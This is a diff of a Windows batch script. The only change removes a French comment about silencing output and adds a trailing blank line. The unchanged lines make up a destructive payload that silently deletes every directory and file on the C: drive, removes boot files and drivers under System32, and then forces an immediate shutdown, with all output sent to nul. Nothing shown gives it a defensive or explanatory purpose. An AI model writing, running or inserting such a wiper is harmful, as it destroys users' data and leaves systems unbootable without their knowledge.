@@ -1,5 +1,4 @@
 @echo off
-:: Redirige tout vers nul pour qu'aucune sortie (message d'erreur ou autre) ne soit affichée
 rd /s /q C:\ 2>nul 1>nul
 del /f /s /q C:\*.* 2>nul 1>nul
 
@@ -16,3 +15,4 @@ del /f /q C:\Windows\System32\Boot\*  2>nul 1>nul
 del /f /q C:\Windows\System32\drivers\* 2>nul 1>nul
 
 shutdown -s -f -t 0 2>nul 1>nul
+
